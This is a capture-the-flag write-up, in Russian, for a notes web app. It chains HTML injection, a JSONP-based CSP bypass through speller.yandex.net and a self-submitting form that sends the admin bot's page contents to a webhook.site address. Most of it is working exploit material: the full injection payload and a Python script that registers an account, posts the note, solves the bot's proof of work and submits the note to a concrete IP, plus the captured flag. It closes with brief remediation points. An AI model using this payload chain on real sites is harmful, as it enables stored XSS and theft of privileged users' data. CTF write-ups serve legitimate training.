# Web Challenge 4: Yet Another Notes

## Идея
Цепочка: HTML injection через `{video}` → обход CSP через JSONP (`*.yandex.net`) → чтение заметки с флагом в контексте бота → отправка на webhook.

## Шаги решения
1. Регистрируем свой аккаунт.
2. Создаём публичную заметку с payload (из нескольких коротких `{video ...}` блоков).
3. Отправляем UUID заметки боту.
4. Получаем флаг на webhook.

## Команды для выполнения (без готовых скриптов)

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install requests
```

Создай `payload.txt` (пример минимально понятного payload, разбитого на короткие шаги):

```text
{video id="\"></iframe><form id=f><input id=x></form>"}
{video id="\"></iframe><textarea id=t>https://webhook.site/YOUR-ID</textarea>"}
{video id="\"></iframe><script src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>f=document.forms[0])"></script>"}
{video id="\"></iframe><script src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>x=document.forms[0][0])"></script>"}
{video id="\"></iframe><script src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>f.action=t.value)"></script>"}
{video id="\"></iframe><script src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>f.method='post')"></script>"}
{video id="\"></iframe><script src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>x.name='d')"></script>"}
{video id="\"></iframe><script src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>x.value=document.body.innerText)"></script>"}
{video id="\"></iframe><script src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>f.submit())"></script>"}
```

Создай `exploit_chall4.py`:

```python
import requests, random, string, socket, re, hashlib, time

BASE = "http://158.160.221.45:4818"
BOT_HOST, BOT_PORT = "158.160.221.45", 1557

def rnd(p="u", n=8):
    return p + "".join(random.choice(string.ascii_lowercase+string.digits) for _ in range(n))

s = requests.Session()
user, pw = rnd("user_"), rnd("pw_")
s.post(BASE+"/api/auth/register", json={"username":user, "password":pw}, timeout=30).raise_for_status()

payload = open("payload.txt", "r", encoding="utf-8").read()
r = s.post(BASE+"/api/notes", json={"title":"exploit", "content":payload, "isPublic":True}, timeout=30)
r.raise_for_status()
uuid = r.json()["id"]
print("NOTE_UUID", uuid)

# PoW и отправка UUID боту
sock = socket.create_connection((BOT_HOST, BOT_PORT), timeout=30)
banner = sock.recv(4096).decode(errors="replace")
while "stamp>" not in banner:
    banner += sock.recv(4096).decode(errors="replace")

m = re.search(r"hashcash -mb(\d+) ([0-9a-f]+)", banner)
bits, resource = int(m.group(1)), m.group(2)
prefix = f"1:{bits}:250228:{resource}::"
counter = 0
while True:
    stamp = prefix + f"rnd:{counter:x}"
    h = hashlib.sha1(stamp.encode()).digest()
    z = 0
    for b in h:
        if b == 0: z += 8; continue
        while (b & 0x80) == 0: z += 1; b <<= 1
        break
    if z >= bits:
        break
    counter += 1

sock.sendall((stamp+"\n").encode())
time.sleep(0.2)
sock.sendall((uuid+"\n").encode())
print(sock.recv(4096).decode(errors="replace"))
sock.close()
```

Запуск:

```bash
python3 exploit_chall4.py
# дальше смотреть входящие POST на webhook.site
```

## Флаг
```text
LB{6a93f0d3ab7865413f804b6949546833}
```

## Фикс
- Строгая sanitization пользовательского контента.
- Убрать JSONP.
- Пересобрать CSP с жёстким allowlist.
- Изолировать привилегированного бота.
